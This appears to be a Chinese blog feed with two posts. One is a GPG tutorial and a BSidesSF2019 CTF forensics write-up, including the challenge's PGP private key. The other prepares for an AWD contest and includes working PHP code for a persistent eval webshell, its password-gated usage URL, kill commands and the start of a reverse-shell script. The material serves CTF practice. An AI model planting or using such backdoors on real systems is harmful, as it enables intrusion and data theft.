src="https://p4.ssl.qhimg.com/t01f1005086c87c77f4.png" alt="m0re" loading="lazy"><br>这是著名的凯撒密码，使用这种加密方式来传输重要消息，是不安全的。</p><p>这是前置知识，下面就开始学习怎么使用GPG。</p><h1 id="怎么使用？"><a href="#怎么使用？" class="headerlink" title="怎么使用？"></a>怎么使用？</h1><p>安装的话，Linux发行版默认安装的gpg，这个是在终端使用的。还可以安装GUI软件——kgpg</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> kgpg</code></pre><p>笔者这里使用的Terminal命令行。</p><h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><p><strong>1.生成密钥对</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg --gen-key</code></pre><p><img src="https://p2.ssl.qhimg.com/t01e4d707466bc196e5.png" alt="m0re" loading="lazy"></p><p>在此过程中，会提示你设置一个密码。</p><p><strong>2.公钥/私钥的导出和导入</strong><br>公钥的导出：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -o keyfilename --export mykeyID</code></pre><p>如果没有mykeyID则是备份所有的公钥，-o表示输出到文件keyfilename中，如果加上-a的参数则输出文本格式( ASCII )的信息，否则输出的是二进制格式信息。</p><p>私钥的导出：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -o keyfilename --export-secret-keys mykeyID</code></pre><p>如果没有mykeyID则是备份所有的私钥，-o表示输出到文件keyfilename中，如果加上-a的参数则输出文本格式的信息，否则输出的是二进制格式信息。</p><p><img src="https://p4.ssl.qhimg.com/t01c9e18f89e7578573.png" loading="lazy"></p><p>密钥的导入：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg --import filename</code></pre><p>PS：无论是私钥的导入还是导出，都需要输入密码。<br>使用<code>gpg --list-keys</code>命令查看是否成功导入了密钥。<br><img src="https://p2.ssl.qhimg.com/t016e00208bb30b3af0.png" alt="m0re" loading="lazy"></p><p><strong>3.加密文件</strong><br>3.1非对称加密</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -a --output m0re.gpg -r m0re.lxj@qq.com -e m0re.txt</code></pre><p>其中参数：<br><code>-a</code> 表示输出文本文件格式。 <code>--output</code> 指定输出（即加密后）的文件名。 <code>-r</code> 指定信息的接收者（<code>recipient</code>）公钥的<code>uid</code>，可以是名字也可以是<code>email</code>地址。 <code>-e</code> 表示这次要执行的是加密（<code>encrypt</code>）操作。<br>执行完毕之后会在当前文件夹产生文件 m0re.gpg，这个就是被加密之后的文件。<br><img src="https://p5.ssl.qhimg.com/t017e89cbb598deab38.png" alt="m0re" loading="lazy"><br>3.2对称加密<br><code>gpg</code>也可以进行对称加密<br><code>gpg</code>有个<code>-c</code>参数，只进行对称加密。</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -o m0re.gpg -c m0re.png</code></pre><p>此时不需要密钥，密码也可以自己随意设定。</p><p><strong>4.解密文件</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -d m0re.gpg</code></pre><p>输入密码。即可解密成功。<br><img src="https://p4.ssl.qhimg.com/t01e591e1fb34a6dae3.png" loading="lazy"><br>还有一中方法是利用工具——PGPTool，这个在下面解题会说到。</p><p><strong>5.删除密钥</strong><br>命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg --delete-secret-keys <span class="token punctuation">[</span>emailaddress<span class="token punctuation">]</span></code></pre><p><img src="https://p5.ssl.qhimg.com/t012527b016cbda9bae.png" loading="lazy"></p><p><strong>6.对文件进行数字签名</strong><br>第一种签名方法<br>使用命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -a -b m0re.txt</code></pre><p>自动生成一个文件名为<code>    m0re.txt.asc</code>的加密后的文件<br><code>-a</code> 表示输出文本文件格式。 <code>-b</code> 表示以生成独立的签名文件的方式进行签名。<br>一般发送者将信息文件和签名文件一同发给接收者。接收者利用签名文件来验证信息文件。<br>检验命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg --verify m0re.txt.asc</code></pre><p>出现下图所示的样子即可。<br><img src="https://p3.ssl.qhimg.com/t01bddd08e7a003492e.png" loading="lazy"><br>如果不是这样的，那么表示信息文件被人恶意改动。或者不是我本人发出。<br>第二种签名方法<br>如果不想生成一个独立的签名文件，则还可以用如下的命令进行签名：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gpg -a --clearsign m0re.txt</code></pre><p>跟方法1不同的地方是用参数<code> –clearsign</code> 替代了参数 <code>-b</code>。参数 <code>clearsign</code> 表示将签名和原信息合并在一起，并生成一个新文件。<br>命令运行后同样会生成一个文件 m0re.txt.asc，内容如下</p><pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN PGP SIGNED MESSAGE-----Hash: SHA512芜湖起飞～-----BEGIN PGP SIGNATURE-----iQGzBAEBCgAdFiEEFyHZb/vph9hAiDnAZVWJTjMZ80cFAl/8TsEACgkQZVWJTjMZ80fYMwv/TqvBzhf3aawl51nNUqLRaFdvULTgDc0PqgEcIubcdQ91MFLgoVZxPiw4Me1NuaHX8yxTXonxP8DmfVCJwAMwjYev/qvhNEnbHTFICgVapP81vIuDztZco6Gav3kyITSfwaHjLDnzf6aZH6oJQyQIyupnNmWTFIjXYM0h36RPC9sB13fjFv7QKqZJNuOLcWuhwaDygKhelDzGriPmoNPltcj0CMqqs+FkBy0PeaJMQymGMZGqlK5THl07B7NXKFoFk4WgGkFBAQVEVrSnrpokvhpxCl8z25ni2gd52jUoche2Z1gEsOeAYNkey2mJ/4+PJngKxep4rGzqamxSIQz3lpXcpZv8eECLDkEajrDorwIaKFsQwUGaDVtBC2s5LqGd2KxjxHccZYQ30ki3uxI4hjI0zMif0jw6kCtzw7jWdVOihFix4iggw8QJZ2+id18t0Tx+wKtF16dUy9SIpk5U5eaAMQUp/PmhPClJUwS4rWQtNpnGs0SwIaoSbf0mPckV<span class="token operator">=</span>DjMX-----END PGP SIGNATURE-----</code></pre><p>复制内容到一个人文本文件中<code>hello.txt</code><br>再进行验证<code>gpg --verify hello.txt</code><br>如图即是无误的信息。<br><img src="https://p5.ssl.qhimg.com/t01ab64f84222694ca3.png" loading="lazy"></p><p><strong>7.常用参数</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">-s, --sign <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span>           生成一份签字--clearsign <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span>      生成一份明文签字-b, --detach-sign             生成一份分离的签字-e, --encrypt                 加密数据-c, --symmetric               仅使用对称加密-d, --decrypt                 解密数据<span class="token punctuation">(</span>默认<span class="token punctuation">)</span>--verify                  验证签字--list-keys               列出密钥--list-sigs               列出密钥和签字--check-sigs              列出并检查密钥签字--fingerprint             列出密钥和指纹-K, --list-secret-keys        列出私钥--gen-key                 生成一副新的密钥对--delete-keys             从公钥钥匙环里删除密钥--delete-secret-keys      从私钥钥匙环里删除密钥--sign-key                为某把密钥添加签字--lsign-key               为某把密钥添加本地签字--edit-key                编辑某把密钥或为其添加签字--gen-revoke              生成一份吊销证书--export                  导出密钥--send-keys               把密钥导出到某个公钥服务器上--recv-keys               从公钥服务器上导入密钥--search-keys             在公钥服务器上搜寻密钥--refresh-keys            从公钥服务器更新所有的本地密钥--import                  导入/合并密钥--card-status             打印卡状态--card-edit               更改卡上的数据--change-pin              更改卡的 PIN--update-trustdb          更新信任度数据库--print-md 算法 <span class="token punctuation">[</span>文件<span class="token punctuation">]</span>    使用指定的散列算法打印报文散列值选项：-a, --armor                   输出经 ASCII 封装-r, --recipient 某甲          为收件者“某甲”加密-u, --local-user              使用这个用户标识来签字或解密-z N                          设定压缩等级为 N <span class="token punctuation">(</span><span class="token number">0</span> 表示不压缩<span class="token punctuation">)</span>--textmode                使用标准的文本模式-o, --output                  指定输出文件-v, --verbose                 详细模式-n, --dry-run                 不做任何改变-i, --interactive             覆盖前先询问--openpgp                 行为严格遵循 OpenPGP 定义--pgp2                    生成与 PGP <span class="token number">2</span>.x 兼容的报文</code></pre><h1 id="BSidesSF2019——bWF0cnlvc2hrYQ"><a href="#BSidesSF2019——bWF0cnlvc2hrYQ" class="headerlink" title="BSidesSF2019——bWF0cnlvc2hrYQ=="></a>BSidesSF2019——bWF0cnlvc2hrYQ==</h1><p>GPG的学习到此为一段落，下面把那一道CTF题目复现一下。这道题目的wp在网上也没有找到特别详细的。所以花的时间多了一点。<br>后来发现在BUUCTF上面有这道题目。<br>题目复现地址——<a href="https://buuoj.cn/challenges#[BSidesSF2019]bWF0cnlvc2hrYQ">BUUCTF</a><br>题目是base64编码，解出是<code>matryoshka</code>翻译则是俄罗斯套娃<br><img src="https://p5.ssl.qhimg.com/t01d0c1f51586af0011.jpg" alt="m0re" loading="lazy"><br>下载得到的附件是eml文件，这里我没有去找查看eml的工具，所以跟大佬的wp，通过QQ邮箱发送邮件，并选择eml附件给自己。<br>然后预览附件<br><img src="https://p2.ssl.qhimg.com/t0134cb1976dfd8ab78.png" alt="m0re" loading="lazy"><br>将附件下载下来，可以得到hack.gpg这个加密文件。还有一个私钥文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN PGP PRIVATE KEY BLOCK-----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<span class="token operator">=</span><span class="token operator">=</span>Hhg6-----END PGP PRIVATE KEY BLOCK-----</code></pre><p><img src="https://p5.ssl.qhimg.com/t010ce0dcd9cd0ebca1.png" loading="lazy"><br>现在就差密码了。这个点卡了我好久，因为网上的资料显示直接得到密码，但是不理解为什么，后来就找到了GitHub中的一个师傅写的wp。<br>说是在QQ邮箱中不显示头像，头像是个二维码。可以在记事本中打开eml文件搜索face，找到头像的base64编码。然后进行转换图片，即可得到二维码<br><img src="https://p0.ssl.qhimg.com/t01444d4e5e55756d27.png" alt="m0re" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">Face:iVBORw0KGgoAAAANSUhEUgAAADAAAAAwAQMAAABtzGvEAAAABlBMVEX///8AAABVwtN+AAAACXBI WXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4wMBBAIZ8ky8pwAAAJRJREFUGFdlzbEJwzAQBdAzB04T khE0gzqrkVYRZIEMIHAgawiyyqWJS69g8AhqXIT8FPERI1evfAQ0GaAV4ZCFK4bS5HH+49OWNu4Q 7pKwArjf4DJARG0kUlAWY3PFcsUcoLjyMhSV5ShsJ8XhMHuuIAr3z0UBfP/MijD1FspQOiNmh6cT bUjNTRF2j/NUAfg4vle+pY6V5XCWRiUAAAAASUVORK5CYII<span class="token operator">=</span></code></pre><p>进行base64转图片得到<br><img src="https://p4.ssl.qhimg.com/t01c8c197b7fe5378bc.png" alt="m0re" loading="lazy"><br>扫描得到<code>h4ck_the_plan3t</code><br>猜测就是密码了。<br>尝试进行解密，这里介绍一个工具。GPGTool<br>先导入密钥<br><img src="https://p1.ssl.qhimg.com/t015567e66eb12efcee.png" alt="m0re" loading="lazy"><br>然后选择Decrypt file，选择hack.gpg，输入密码，即可得到解密后的文件。<br><img src="https://p3.ssl.qhimg.com/t01876f88b1a252394e.png" alt="m0re" loading="lazy"><br><code>hack4.zip</code>——&gt;<code>file.bin</code>，<br>首先查看是什么文件，看到数据文件，先尝试了binwalk<br><img src="https://p2.ssl.qhimg.com/t01073055fd7184a591.png" loading="lazy"><br>lzip文件，所以我使用010editor打开看一下。<br><img src="https://p0.ssl.qhimg.com/t0173ba01a12115c4a5.png" alt="m0re" loading="lazy"><br>百度搜索lzip的内容，但是确实少之又少。直到我找到wp，删除前11个字节，lzip文件的开头应当是lzip。即<code>4C5A4950</code>开头。<br>解压该文件，注意使用lzip命令，kali默认不安装，所以需要手动安装</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> lzip</code></pre><p><img src="https://p0.ssl.qhimg.com/t012cac939d83780c11.png" alt="m0re" loading="lazy"></p><p>发现是PDF文件，该文件后缀查看。<br><img src="https://p0.ssl.qhimg.com/t01cfe2b06a7a08be42.png" loading="lazy"><br>这个是WindowsXP的经典桌面壁纸。<br>原图——<a href="https://en.wikipedia.org/wiki/Bliss_(image)">维基百科</a><br>仔细看白云的部分，会发现有明显的跟切割似的地方。从PDF里将图片提取出来，然后使用stegslove打开，在blue通道的2和3，看到非常类似二维码<br><img src="https://p1.ssl.qhimg.com/t018ac645adb2b96a13.png" loading="lazy"><br>然后是双图的考点，记得提前保存原图。<br>导入在维基百科下载的原图。<br><img src="https://p0.ssl.qhimg.com/t0168056eaa6c0beeea.png" loading="lazy"><br>保存一下，然后扫描二维码得到</p><pre class="language-bash" data-language="bash"><code class="language-bash">/Td6WFoAAATm1rRGAgAhARwAAAAQz1jM4ELCAORdABhgwwZfNTLh1bKR4pwkkcJw0DSEZd2BcWATAJkrMgnKT8nBgYQaCPtrzORiOeUVq7DDoe9feCLt9PG-MT9ZCLwmtpdfvW0n17pie8v0h7RS4dO/yb7JHn7sFqYYnDWZere/6BI3AiyraCtQ6qZmYZnHemfLVXmCXHan5fN6IiJL7uJdoJBZC3Rb1hiH1MdlFQ/1uOwaoglBdswAGo99HbOhsSFS5gGqo6WQ2dzK3E7NcYP2YIQxS9BGibr4Qulc6e5CaCHAZ4pAhfLVTYoN5R7l/cWvU3mLOSPUkELK6StPUBd0AABBU17Cf970JQABgALDhQEApzo4PbHEZ/sCAAAAAARZWg<span class="token operator">==</span></code></pre><p>进行base64编码，即可看到开头明显的7z，所以猜测这是压缩包。<br><img src="https://p2.ssl.qhimg.com/t01d982e686b5d33365.png" loading="lazy"></p><p>但是在转换过程，一直没有成功。base64解码后转数据实现不了，太菜了呀。就借用了写出来wp的师傅的文件。<a href="https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy8sGto5CLNupxyVZc%2F-L_ArNCgFVPyxHrFjWiV%2F-L_B6H0Z9oXSS-4-5AHx%2Fout.7z?alt=media&token=b4c51146-5a2d-4813-a2f1-0cd19cc84091">点击下载</a></p><p><img src="https://p2.ssl.qhimg.com/t013849d3e2852ec28e.png" loading="lazy"><br>按照自上而下的顺序来<code>binary-octal-decimal-hex-ascii</code><br>得到base64编码为<code>Nlc/TyVBN11SY0ZDL2EuP1lzcSFCallwdERmMCEz</code><br>进行解码得到：<code>6W?O%A7]RcFC/a.?Ysq!BjYptDf0!3</code><br>在进行base85解码：<code>CTF&#123;delat_iz_muhi_slona&#125;</code><br><img src="https://p3.ssl.qhimg.com/t01bb8ca22e7a611237.png" alt="m0re" loading="lazy"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次学到了知识有：<br>1.GPG非对称加密<br>2.lzip隐写<br>3.复习了 双图隐写</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://tuanlinh.gitbook.io/ctf/bsidessf-2019-ctf#forensic-bwf-0-cnlvc-2-hryq">https://tuanlinh.gitbook.io/ctf/bsidessf-2019-ctf#forensic-bwf-0-cnlvc-2-hryq</a><br><a href="https://reverseltf.wordpress.com/2019/08/01/bsidessf2018-matryoshkas-revenge-writeup/">https://reverseltf.wordpress.com/2019/08/01/bsidessf2018-matryoshkas-revenge-writeup/</a><br><a href="https://en.wikipedia.org/wiki/Lzip">https://en.wikipedia.org/wiki/Lzip</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GPG非对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次AWD赛前准备与赛后小结</title>
      <link href="/posts/f2e254f8/"/>
      <url>/posts/f2e254f8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/23.jpg" loading="lazy"></p><a id="more"></a><h2 id="赛前"><a href="#赛前" class="headerlink" title="赛前"></a>赛前</h2><p>记录一下，菜鸟第一次打AWD的经历，可能会对跟我一样的小白们有些帮助。<br />比赛之前，先记录一下学的东西。感谢(@Sn0w)学长搭建的AWD靶场给我们。<br />基础知识网上有好多，就不写了。</p><h3 id="不死马的利用与删除"><a href="#不死马的利用与删除" class="headerlink" title="不死马的利用与删除"></a>不死马的利用与删除</h3><p>首先学习的就是不死马，因为它比较经典吧。<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608189921418-dad62a7f-ba2f-4208-82ae-159840535720.png" loading="lazy"><br />密码为md5加密过的为m0re666，然后传参。<br />假设已经传上不死马。<br />首先，利用方式为，先访问一下，一般是upload文件夹有上传权限，所以一般放这里<br />访问<a href="http://xxx.xxx.xxx.xxx/upload/header.php">http://xxx.xxx.xxx.xxx:/upload/header.php</a><br />访问执行后，不死马开始起作用了，直接访问<a href="http://xxx.xxx.xxx.xxx/.login.php?passwd=m0re666&amp;m0re=system">http://xxx.xxx.xxx.xxx:/.login.php?passwd=m0re666&amp;m0re=system</a>(‘cat /flag’);<br />得到flag。因为是不死马，所以可以一直使用这个点来得分，不过现在不死马已人尽皆知，恐怕只能拿一轮分数就会被杀了。</p><h4 id="变种不死马"><a href="#变种不死马" class="headerlink" title="变种不死马"></a>变种不死马</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'.login.php'</span><span class="token punctuation">;</span><span class="token variable">$file1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'-header.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php if(md5($_GET["passwd"])=="8895b28b63e543b78f8bc5eaff8f3d86")&#123;@eval($_REQUEST["m0re"]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//system('touch -m -d "2018-12-01 09:10:12" .login.php');</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file1</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>#passwd=m0re666&amp;m0re=system('cat /flag');</code></pre><p>这个变种的，它的不同点在文件名，是-开头的，这里介绍一下这个比较骚的知识点。<br />-开头的文件名，因为在Linux命令行中，各种命令会有许多的参数，所以，如果对这样方式命名的文件，执行任何命令，都会将这个文件当做参数来执行命令，没有该参数就会报错。导致什么命令都无法在这个不死马上执行，但是，在浏览器中连接访问是没问题的，依旧可以解析。可以在自己服务器上开docker进行尝试。<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1609912404026-48e4fe21-dffe-4944-80d5-b980dcdcacab.png" loading="lazy"></p><h4 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> www-data <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9</code></pre><p><a name="Popp6"></a></p><h4 id="条件竞争杀不死马"><a href="#条件竞争杀不死马" class="headerlink" title="条件竞争杀不死马"></a>条件竞争杀不死马</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">dire</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php/"</span><span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php"</span><span class="token function">rm</span> -rf <span class="token variable">$file</span><span class="token function">mkdir</span> <span class="token variable">$dire</span>./xx.sh</code></pre><p>具体的其他杀不死马的方式还有很多，不列举了。<br><a name="2V7d8"></a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">which</span><span class="token punctuation">(</span><span class="token variable">$pr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"which <span class="token interpolation"><span class="token variable">$pr</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">?</span> <span class="token variable">$path</span> <span class="token punctuation">:</span> <span class="token variable">$pr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'system'</span><span class="token 